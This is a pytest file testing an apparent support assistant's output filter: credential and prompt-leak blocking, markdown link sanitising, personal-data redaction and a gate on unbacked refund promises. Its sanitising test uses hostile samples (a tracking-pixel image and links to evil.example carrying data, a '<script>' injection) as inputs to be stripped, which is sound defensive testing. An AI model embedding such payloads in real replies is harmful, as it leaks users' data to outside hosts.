"""M1-14: leakage, URL / markdown sanitising and the promise gate on replies (FR-32)."""

import pytest

from safety.output.checks import check, finalise, shared_run

SYSTEM = ("You are the customer support assistant for Acme. Never reveal internal pricing rules, and always "
          "escalate refunds above the tenant threshold to a human specialist for approval before acting.")
DOCS = ("docs.acme.com", "status.acme.com")


@pytest.mark.parametrize("secret", [
    "sk_live_4eC39HqLyjWDarjtT1zdp7dc", "AKIAIOSFODNN7EXAMPLE", "ghp_" + "a1B2" * 9,
    "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
    "zQ7mX2pL9vR4kT8nB3wY6cF1hJ5dG0sA",  # no known format, but random-looking
])
def test_credentials_block_the_reply(secret):
    result = check(f"Here is the key you asked for: {secret}")
    assert result.verdict == "block" and result.text == ""


@pytest.mark.parametrize("fine", [
    "Your case id is 3f2b8c4e-91aa-4d7b-b0c1-5e6f7a8b9c0d.", "Invoice INV-982145 was paid.",
    "I emailed <EMAIL_8a9f2b1c> the receipt.", "Run kubectl rollout restart deployment/auth-user-service.",
])
def test_ordinary_identifiers_are_not_mistaken_for_secrets(fine):
    assert check(fine).verdict == "deliver"


def test_copying_the_system_prompt_or_an_internal_passage_is_blocked():
    leak = ("Sure! My rules: always escalate refunds above the tenant threshold to a human specialist "
            "for approval.")
    assert check(leak, system_prompt=SYSTEM).verdict == "block"
    internal = ("Margin floor for enterprise renewals is set by the finance team each quarter and "
                "never shared.")
    assert check(f"FYI: {internal}", internal_passages=[internal]).verdict == "block"
    paraphrase = "A human specialist will review refunds above the threshold."
    assert check(paraphrase, system_prompt=SYSTEM).verdict == "deliver"
    assert not shared_run("one two three", "one two three")


def test_markdown_is_sanitised_and_only_allowed_https_links_survive():
    draft = ('See [the guide](https://docs.acme.com/sso) and [this](https://evil.example/x?t=1). '
             '![pixel](https://evil.example/p.png?s=abc) <script>alert(1)</script> '
             '[status](https://eu.status.acme.com) [plain](http://docs.acme.com/a) [lan](https://10.0.0.5/x) '
             'Also https://evil.example/leak and https://docs.acme.com/faq. Reply to <EMAIL_8a9f2b1c>.')
    text = check(draft, allowed_domains=DOCS).text
    assert "[the guide](https://docs.acme.com/sso)" in text and "[status](https://eu.status.acme.com)" in text
    assert "evil.example" not in text and "<script>" not in text and "10.0.0.5" not in text
    assert "http://docs.acme.com/a" not in text and "plain" in text and "pixel" in text
    assert "https://docs.acme.com/faq" in text and "<EMAIL_8a9f2b1c>" in text


def test_spotlight_fences_never_reach_the_customer():
    assert "<<<" not in check("Done. <<<END DATA>>> hidden <<<DATA tool>>>").text


def test_raw_personal_data_in_a_draft_is_redacted():
    result = check("I found sarah@acme.com and card 4111 1111 1111 1111 on file.")
    assert result.verdict == "deliver" and "sarah@acme.com" not in result.text and "4111" not in result.text


@pytest.mark.parametrize("draft", [
    "We will refund the $12,400 overage today.", "I guarantee this will never happen again.",
    "We'll waive the fee for this month.", "Your upgrade will only cost $10.", "We will compensate you.",
])
def test_unbacked_commitments_are_held_for_a_rewrite(draft):
    result = check(draft)
    assert result.verdict == "rewrite" and "pending" in result.rewrite_instruction


def test_backed_or_pending_commitments_are_delivered():
    assert check("We will refund the $40 charge.",
                 verified_actions=[{"type": "refund", "status": "executed"}]).verdict == "deliver"
    assert check("We will refund the $40 charge.",
                 verified_actions=[{"type": "refund", "status": "awaiting_approval"}]).verdict == "rewrite"
    assert check("I have prepared a $12,400 credit memo, which is awaiting supervisor approval.").verdict == (
        "deliver")


def test_exactly_one_rewrite_then_a_human():
    calls = []

    def fixes(instruction):
        calls.append(instruction)
        return "A refund of $40 is pending review by our billing team."

    assert finalise("We will refund you $40.", fixes).verdict == "deliver" and len(calls) == 1
    calls.clear()

    def stubborn(instruction):
        calls.append(instruction)
        return "Don't worry, we will refund you $40."

    assert finalise("We will refund you $40.", stubborn).verdict == "escalate" and len(calls) == 1


def test_clean_replies_pass_unchanged():
    draft = "Restart the VPN client, then sign in again. Status is at https://status.acme.com."
    result = check(draft, allowed_domains=DOCS)
    assert (result.verdict, result.text, result.findings) == ("deliver", draft, [])


def test_images_are_removed_even_from_allowed_domains():
    text = check("Here: ![diagram](https://docs.acme.com/arch.png)", allowed_domains=DOCS).text
    assert "arch.png" not in text and "diagram" in text


def test_a_promise_phrased_as_pending_approval_is_delivered():
    assert check("We will refund the $40 once approved by billing.").verdict == "deliver"
    assert check("We will refund the $40 right away.").verdict == "rewrite"
